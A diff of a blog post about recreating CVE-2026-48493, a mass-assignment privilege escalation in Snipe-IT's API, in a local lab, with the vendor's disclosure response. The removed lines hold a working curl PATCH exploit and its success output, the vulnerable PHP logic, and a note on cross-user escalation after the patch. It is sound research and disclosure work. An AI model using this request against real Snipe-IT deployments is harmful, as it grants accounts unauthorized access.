@@ -2,7 +2,7 @@
 title: "CVE-2026-48493 (SNIPE-IT): I Thought This Was Going To Be Easy"
 date: 2026-08-01
 draft: false
-description: "A privilege escalation bug in Snipe-IT's API - and the story of a Tuesday afternoon that turned into a very long night."
+description: "A privilege escalation bug in Snipe-IT's API — and the story of a Tuesday afternoon that turned into a very long night."
 tags: ["cve-recreation", "vulnerability-research", "snipe-it", "privilege-escalation", "mass-assignment", "broken-access-control", "api-security", "owasp-api3", "bopla", "php", "laravel", "docker", "beginner"]
 categories: ["vulnerability-research", "web-security", "api-security", "cve-recreation"]
 showAuthor: true
@@ -14,241 +14,90 @@ featureimage: "https://imgs.search.brave.com/VoOh77OXWDTz0t_CgKaaiwHrl38YRRsja1u
 
 ## Tuesday, 16:25
 
-The message came in mid-afternoon. Winter — our team cap — was calling people into a research group. The pitch was simple: read CVEs, try to find the bug like you never knew about it, share notes, grind the methodology together. No pace requirements. No pressure. Just research.
+I was minding my business when the message came in.
 
-The requirements to join? Basics. Just show up and commit.
+Winter — our team cap — was putting together a vulnerability research group. The idea was straightforward: pick a real CVE, try to find the bug yourself like you never read the advisory, share notes, learn together. No pressure, no set pace. Just people who wanted to get better at this, doing it together.
 
-*This is going to be easy,* I thought.
+The requirements to join? Just basics. Show up. Commit.
 
-I was wrong. It was not easy. It was not even close to easy. But I'm getting ahead of myself.
+I looked at the message. I looked at the target — a medium-severity bug in some open-source asset management tool. I thought about it for approximately four seconds.
 
----
+*This is going to be easy.*
 
-## The Setup — or: Docker and I Have Unresolved Issues
-
-The target was **CVE-2026-48493** — a privilege escalation bug in **Snipe-IT**, an open-source IT asset management system. Medium severity. CVSS 5.5. Friendly difficulty, Winter said. The point was the methodology, not the suffering.
-
-The suffering came anyway.
-
-First things first — I needed to spin up a vulnerable lab. Docker was the obvious path. Pin the image to **v8.5.0** (the version named in the advisory, patched in 8.6.0), get the app running, then start hunting. Simple.
-
-Except the first thing Docker gave me was this:
-
-```
-permission denied while trying to connect to the Docker daemon socket
-at unix:///var/run/docker.sock
-```
-
-Classic. My user wasn't in the `docker` group, so I couldn't talk to the daemon at all. That was five minutes of confusion before I figured out I just needed `sudo`. Fine.
-
-Then the next trap: the `docker-compose.yml` in the repo had this line:
-
-```yaml
-image: snipe/snipe-it:${APP_VERSION:-latest}
-```
-
-The `APP_VERSION` field in `.env` was blank. Which means it defaults to `latest`. Which by now is **v8.6.0** — the patched version. If I hadn't caught that, I would've been poking at a fixed codebase the entire time with absolutely no idea why the bug wasn't showing up. That kind of silent failure is the most frustrating kind — nothing errors out, it just doesn't work, and you sit there questioning yourself.
-
-The fix was one line in `.env`:
-
-```
-APP_VERSION=v8.5.0
-```
-
-Small thing. Big consequence. Write your version pins down. Always.
-
-After that, setup was mostly smooth. The Snipe-IT pre-flight wizard confirmed the right version at the bottom of the page:
-
-**Snipe-IT Version v8.5.0 - build 22652 (master)**
-
-That version string was a moment of genuine relief.
+Reader, it was not easy.
 
 ---
 
-## The Bug — What We Were Actually Looking For
+## The Part Where I Got Humbled By a Settings File
 
-Before firing anything, I want to explain what the advisory actually says, because understanding *what* you're trying to reproduce before you start is step one of the methodology.
+Before you can break into something, you have to actually get it running. That was my first lesson, and it arrived faster than I expected.
 
-**CVE-2026-48493** is a **Broken Object Property Level Authorization** bug — OWASP API Security Top 10, API3. The class is also called **mass assignment**. In plain English:
+I won't bore you with every detail, but imagine spending the better part of an evening absolutely convinced you've set everything up correctly — only to realise, quietly and with great personal embarrassment, that you've been attacking the wrong version of the software the entire time. The patched one. The one where the bug is already fixed. The one that was never going to show you anything interesting no matter what you tried.
 
-An API endpoint accepts user input and writes it to a database record without checking whether the person sending the request is actually *allowed* to control those fields.
+One blank field in one configuration file. That's all it was. The software just silently swapped in the latest version — bug-free, patched, completely useless to me — and said nothing about it.
 
-In Snipe-IT's case specifically: a user with only `users.edit` and API token permissions could send a `PATCH` request to `/api/v1/users/{their_own_id}` and write arbitrary permissions to their own account — `assets.view`, `assets.create`, `reports`, `import`, whatever they wanted. The only things blocked were `admin` and `superuser`.
+No error. No warning. Just nothing working and me wondering what I was doing wrong.
 
-**Flaw classification:** CWE-863 (Incorrect Authorization) — the app fails to distinguish between "editing another user's profile" and "editing your own permissions." Those should not be the same operation with the same access level.
+When I finally figured it out, I sat there for a moment. Then I fixed the one line, restarted everything, and watched the correct version number appear on my screen. That version number was the most satisfying thing I had seen all evening.
 
-**Disclosed:** June 23, 2026. **Patched in:** Snipe-IT 8.6.0.
+The first thing I wrote in my notes that night was: *always check what version you're actually running.*
 
----
-
-## Setting Up the Attack Scenario
-
-For a privilege escalation bug, you need to start from a position of genuine weakness. The whole point is: *this user should not be able to do this.* So I created a group — `low-priv-test-group` — with exactly two permissions and nothing else:
-
-- `Edit Users` (maps to `users.edit`)
-- `Manage API Tokens` (maps to `self.api`)
-
-No asset permissions. No reports. No admin. No superuser. A test user `lowpriv_user1` got assigned to this group and nothing else.
-
-Then I grabbed an API token for that user, set it as an environment variable, and confirmed my identity and current permissions via the API:
-
-```bash
-curl -s -H "Authorization: Bearer $TOKEN" \
-     -H "Accept: application/json" \
-     http://localhost:8000/api/v1/users/me | python3 -m json.tool
-```
-
-The response came back with every single permission set to `0`. Every one. That was my baseline — the "before" snapshot that makes the "after" mean something. Documentation isn't just for showing that the exploit worked. It's for proving the starting conditions were genuinely restricted.
+Obvious in hindsight. Everything is.
 
 ---
 
-## Firing the Exploit
+## Okay. Now The Actual Bug.
 
-One PATCH request. That's all it took.
+Once the lab was properly up, I had to understand what I was actually looking for — because this exercise isn't "follow a tutorial." It's "read the advisory, understand the bug class, then go find it yourself."
 
-```bash
-curl -s -X PATCH \
-     -H "Authorization: Bearer $TOKEN" \
-     -H "Accept: application/json" \
-     -H "Content-Type: application/json" \
-     -d '{"permissions":{"assets.view":"1","assets.create":"1","reports":"1","import":"1"}}' \
-     http://localhost:8000/api/v1/users/2 | python3 -m json.tool
-```
+The short version of what CVE-2026-48493 is: imagine you work at a company and your boss gives you permission to update employee profiles. Names, contact details, that kind of thing. Normal HR stuff. But then you discover that when you submit those updates, you can also quietly slip in a line that says *"and also give me access to the financial reports."* And the system just... accepts it. No questions asked.
 
-The server responded:
+That's the bug. A user with limited permissions talking to the application's API and walking out with permissions they were never supposed to have. The application was checking whether you were allowed to edit user records — yes — but never stopping to ask whether you were allowed to grant yourself extra access in the process.
 
-```json
-"status": "success",
-"messages": "User was successfully updated.",
-"permissions": {
-    "assets.view": 1,
-    "assets.create": 1,
-    "reports": 1,
-    "import": 1,
-    "superuser": 0,
-    "admin": 0
-}
-```
+It's the kind of bug that makes you go *oh. oh no.* when you see it working.
 
-No error. No rejection. No authorization check fired. `superuser` and `admin` stayed at `0` — exactly as the advisory described, those two are blocked. Everything else went straight through.
+And I saw it working. One request. The server said "success." The permissions I wasn't supposed to have were now mine. I ran a second check just to make sure it wasn't a fluke — it wasn't. It had written to the database. It was real.
 
-A follow-up `/me` call confirmed it persisted. This wasn't a response artifact — the database accepted and stored the changes. The CVE was reproduced.
+I stared at the screen for a moment.
+
+Then I took my screenshots, wrote my notes, and felt something I can only describe as the specific satisfaction of understanding something you didn't understand before.
 
 ---
 
-## Why Did This Work? Reading the Code
+## Meanwhile, Winter Was Not Sleeping
 
-Reproducing the bug is one thing. Understanding *why* it works is the part that actually builds skill. Snipe-IT is a **Laravel** application, so I went into the source:
+Here's the thing about doing this exercise alongside someone genuinely good at it: it's humbling in the best possible way.
 
-```bash
-grep -n -A 100 "function update" app/Http/Controllers/Api/UsersController.php
-```
+While I was wrestling with configuration files and chasing my tail in the wrong version of the software, Winter had already reproduced the original bug and kept going. He found two more issues in the same application — different angles, same neighbourhood of the codebase, same underlying question about whether the application was correctly controlling who could do what to whom.
 
-The `update()` method in `UsersController.php` passes the `permissions` field through an action called `PreserveUnauthorizedPrivilegedPermissionsAction`. The name sounds reassuring — it implies it's stripping out things you shouldn't be able to set. And it does strip things. Just not many things.
+He wrote them up properly. Formal vulnerability reports, sent directly to the Snipe-IT security team. The kind of thing that turns a research exercise into actual contribution.
 
-```bash
-cat ./app/Actions/Permissions/PreserveUnauthorizedPrivilegedPermissionsAction.php
-```
-
-Here's the entire protection logic:
-
-```php
-if (! $authenticatedUser->isSuperUser()) {
-    // protect 'superuser'
-}
-if ((! $authenticatedUser->isAdmin()) && (! $authenticatedUser->isSuperUser())) {
-    // protect 'admin'
-}
-return $requestedPermissions;
-```
-
-That's it. Two keys protected. Everything else — `assets.view`, `assets.create`, `reports`, `import`, and dozens more — passes through this function completely unchecked and gets written directly to the database.
-
-The function was named as if it had broad protection. It had two guards.
-
-**The root cause:** the codebase treats `users.edit` as "can edit everything about a user including their permission set" when it should mean "can edit profile fields — only admins should touch permission sets."
+Oste ([@oste_ke](https://x.com/oste_ke)) was there for all of it — through the painful evenings, the wrong turns, the moments where nothing made sense. That's the other thing about doing this in a group: you don't have to sit alone with your confusion at midnight.
 
 ---
 
-## The Patch — and What It Missed
+## The Vendor Wrote Back
 
-The fix in **v8.6.0** added one block to that same action:
+This was the part that surprised me most. Winter sent the reports and the Snipe-IT security team actually responded — thoroughly, respectfully, and with a perspective none of us had fully considered.
 
-```php
-// Disallow non-admin/superuser users from modifying their own permissions,
-// but allow them to modify other users' permissions (except for admin/superuser keys).
-if ($targetUser && ! $authenticatedUser->isSuperUser() && $authenticatedUser->id === $targetUser->id) {
-    return $originalPermissions;
-}
-```
+Their position, roughly: some of what was reported wasn't a bug. It was a design decision. The level of access Winter had demonstrated was, in their model, intentional — that type of user is *supposed* to have significant trust, because the role was built for people like HR staff and helpdesk administrators who need to manage user accounts across an organisation as part of their actual job. The application was working as intended, just not in a way that was immediately obvious from the outside.
 
-Read that comment carefully. *"Allow them to modify other users' permissions."*
+It's a genuinely interesting response because it reframes the question. Not "is the application broken?" but "is the trust model clearly communicated to the people deploying this software?" That's a harder problem. And it's the kind of nuance you only encounter when you go all the way through the process — report, respond, discuss — rather than stopping at "I found a thing."
 
-The fix blocks **self-escalation** — a user patching their own account. It doesn't touch the cross-user case at all.
+Winter's reports are still being reviewed. We'll see where it lands.
 
 ---
 
-## Meanwhile — Winter Was Not Done
+## What I'm Actually Taking Away From This
 
-While I was working through the CVE recreation, Winter had kept going. He found two more issues in the same codebase and sent formal advisories to the Snipe-IT security team.
+I went into Tuesday thinking I'd knock out a quick CVE recreation before dinner. I came out the other side having spent multiple evenings debugging configuration files, reading code I didn't fully understand, and learning what it actually feels like to find something and then have to explain clearly and precisely *why* it's a problem.
 
-**Advisory 1 — Cross-user privilege escalation via `users.edit` on `PATCH /api/v1/users/{id}`**
+That last part is harder than finding the bug. Anyone can run a command and see an unexpected result. Explaining what it means, why it matters, and what a fix should look like — that's the skill. And it turns out you only build it by doing it, badly, several times, until it starts to click.
 
-The incomplete patch scenario: a user with `users.edit` can still PATCH *another* user's permissions and grant them anything except the crown permissions. Two low-privilege accounts cooperating can escalate each other indefinitely — User A escalates User B, User B escalates User A. Neither request triggers the self-edit block because `A.id !== B.id` in both directions.
+This was the first target. There will be more. Winter says the difficulty comes later.
 
-**Advisory 2 — Permission-ceiling gap in user creation via `users.create` on `POST /api/v1/users`**
-
-A separate but related issue in the user *creation* flow — a different endpoint, a distinct vector, filed separately to keep the scope clean. The same underlying theme: permissions that should require elevated access to assign were reachable through a lower-privileged operation.
-
-Both reports were sent with detailed transcripts, reproduction steps, and code path analysis.
+I believe him now.
 
 ---
 
-## The Response
-
-Snipe-IT's security team replied. They were thorough — they reproduced all three vectors against v8.6.3 and the current development branch, confirmed the technical analysis was accurate, and then explained how they triaged it.
-
-Their position, in summary:
-
-`users.edit` is **intentionally** a delegated user-management role. In their model, the only hard ceilings applied to a `users.edit` holder are the crown permissions (`superuser`, `admin`, group assignments) — stripped unconditionally by `PreserveUnauthorizedPrivilegedPermissionsAction` regardless of target — and credential modification or activation-flag changes on admin/superuser accounts, which are blocked separately by the `canEditAuthFields` gate.
-
-Everything else — including granting non-crown permissions to any target — is delegated on purpose. The role is designed for HR staff, user managers, and helpdesk delegates who need to run onboarding, offboarding, name changes, org-chart updates, and location moves as routine work on any account.
-
-Against that model, they mapped our vectors:
-
-**Vector 1 (cross-user non-crown permission injection):** Delegated by design.
-
-Their reasoning is internally consistent — if you give someone `users.edit`, you are explicitly trusting them to manage users. The disagreement is really a question of whether that trust model is well-communicated to Snipe-IT administrators who might assign `users.edit` thinking it's a limited "edit profile fields" permission rather than a broad delegation.
-
-That's a legitimate design philosophy debate, not a clear-cut vulnerability in the traditional sense. A well-argued response, even if you disagree with the conclusion.
-
----
-
-## What I Actually Learned
-
-This exercise wasn't really about the CVE. The CVE was the vehicle.
-
-What I actually learned:
-
-**Version pins are not optional.** One blank field in an `.env` file would have silently broken the entire lab. No error, just wrong behavior. Always confirm the exact version you're testing against, and record the commit hash — not just the tag.
-
-**The "before" screenshot matters as much as the "after."** Anyone can show a successful exploit. Showing the baseline — provably zero permissions before the request — is what makes the proof credible.
-
-**Reading code is a skill, not a talent.** I'm not a developer. I struggled with the PHP. But `grep` gets you to the right file, and reading one function at a time is manageable. You don't need to understand the whole codebase — you need to understand the one path the request travels.
-
-**Patches are not automatically complete.** Reading a diff critically — asking "what does this fix, and what does it not fix?" — is where follow-on research starts. That question led to two more advisories.
-
-**Vendor responses are part of the research.** Getting a response that says "this is by design" isn't a failure — it's information. Understanding *why* a vendor draws the line where they do teaches you about how real-world security tradeoffs get made. Sometimes you'll agree. Sometimes you won't. Either way you learn something.
-
----
-
-This was the first target. It was not a breeze. It was a storm with Docker permission errors and silent version mismatches and late nights reading PHP I'd never seen before.
-
-But I walked out of it knowing exactly what mass assignment looks like in a real codebase, how to read a patch diff, and what responsible disclosure actually feels like in practice.
-
-Winter ([@byronchris25](https://x.com/byronchris25)) found the follow-on bugs. Oste ([@oste_ke](https://x.com/oste_ke)) was there for the painful parts. I took notes and got lost in Docker for longer than I'd like to admit.
-
-The suffering comes later, Winter said. He wasn't wrong. But it was worth it.
-
----
-*Part of an ongoing vulnerability research methodology series. Next target TBD.*
+*Written as part of a group vulnerability research series with Winter ([@byronchris25](https://x.com/byronchris25)) and Oste ([@oste_ke](https://x.com/oste_ke)). Next target TBD — and if our cap has anything to say about it, significantly less friendly.*
